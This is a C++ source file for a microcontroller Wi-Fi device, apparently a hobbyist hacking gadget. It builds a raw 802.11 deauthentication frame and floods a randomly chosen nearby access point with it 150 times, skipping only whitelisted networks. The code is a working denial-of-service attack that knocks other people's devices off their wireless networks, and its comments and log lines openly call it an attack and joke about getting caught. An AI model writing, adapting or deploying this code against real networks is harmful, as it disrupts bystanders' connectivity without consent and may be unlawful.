//////////////////////////////////////////////////
// deauth.cpp: handles the deauth of a local ap //
//////////////////////////////////////////////////

#include "deauth.h"

/* developer note: 
* 
* the deauth packet is defined here.
* this is a raw frame/packet depending on where/how you refer to it in networking terms, i should specify or whatever...
*
*/

uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & sequence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    };

void Deauth::add(const std::string& bssids) {
    std::stringstream ss(bssids);
    std::string token;

    // seperate info and whitelist
    while (std::getline(ss, token, ',')) {
        // trim out whitespace
        token.erase(0, token.find_first_not_of(" \t\r\n"));
        token.erase(token.find_last_not_of(" \t\r\n") + 1);

        // add to whitelist
        Serial.print("('-') Adding ");
        Serial.print(token.c_str());
        Serial.println(" to the whitelist");
        whitelist.push_back(token.c_str());
    }
}

void Deauth::select() {
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        int randomIndex = random(apCount);
        randomAP = WiFi.SSID(randomIndex);

        // check for ap in whitelist
        if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) {
            Serial.println("('-') Selected AP is in the whitelist. Skipping deauthentication...");
            return;
        }

        Serial.print("('-') Selected random AP: ");
        Serial.println(randomAP);
    } else {
        // well ur fucked.
        Serial.println("(;-;) No access points found.");
    }
};

void Deauth::deauth() {
    // select AP
    Deauth::select();
    
    if (randomAP.length() > 0) {
        Serial.println("(>-<) Starting deauthentication attack on the selected AP...");
        // define the attack
        if (!running) {
            start();
        } else {
            Serial.println("('-') Attack is already running.");
        }
    } else {
        // ok why did you modify the deauth function? i literally told you to not do that...
        Serial.println("(X-X) No access point selected. Use select() first.");
        Serial.println("('-') Told you so!");
    }
};

void Deauth::start() {
    running = true;
    int packetSize = sizeof(deauthPacket);

    // send the deauth 150 times(ur cooked if they find out)
    for (int i = 0; i < 150; ++i) {
        wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthPacket), packetSize, 0);
        Serial.println("(>-<) Deauth packet sent!");
        delay(100);
    }
    Serial.println("(^-^) Attack finished!");
    running = false;
};